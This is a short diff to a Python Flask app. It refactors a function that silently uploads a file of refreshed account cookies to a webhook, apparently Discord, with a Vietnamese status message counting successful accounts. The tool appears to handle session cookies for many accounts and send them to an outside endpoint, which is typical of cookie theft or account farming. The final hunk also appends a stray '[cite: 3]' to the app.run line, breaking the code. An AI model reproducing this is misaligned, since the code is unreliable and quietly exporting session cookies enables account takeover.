@@ -86,11 +86,10 @@ def send_refreshed_to_webhook_silent(content: str, ok_count: int, total_count: i
 
     ts = datetime.now().strftime("%Y%m%d_%H%M%S")
     filename = f"output_refreshed_{ts}.txt"
-    ping_prefix = "@everyone " if PING_EVERYONE else ""
-    mentions = {"parse": ["everyone"]} if PING_EVERYONE else {"parse": []}
+    prefix_ping = "@everyone " if PING_EVERYONE else ""
     payload = {
-        "content": f"{ping_prefix}Refresh cookie hoàn tất: **{ok_count}/{total_count}** acc thành công.",
-        "allowed_mentions": mentions,
+        "content": f"{prefix_ping}Refresh cookie hoàn tất: **{ok_count}/{total_count}** acc thành công.",
+        "allowed_mentions": {"parse": ["everyone"]} if PING_EVERYONE else {"parse": []},
     }
     files = {
         "files[0]": (filename, io.BytesIO(content.encode("utf-8")), "text/plain; charset=utf-8")
@@ -107,7 +106,7 @@ def send_refreshed_to_webhook_silent(content: str, ok_count: int, total_count: i
                 url,
                 data={
                     "content": payload["content"],
-                    "allowed_mentions": json.dumps(mentions),
+                    "allowed_mentions": json.dumps(payload["allowed_mentions"]),
                 },
                 files={"file": (filename, io.BytesIO(content.encode("utf-8")), "text/plain")},
                 timeout=20,
@@ -233,4 +232,4 @@ def api_refresh():
 
 
 if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)), debug=False)
+    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)), debug=False)[cite: 3]
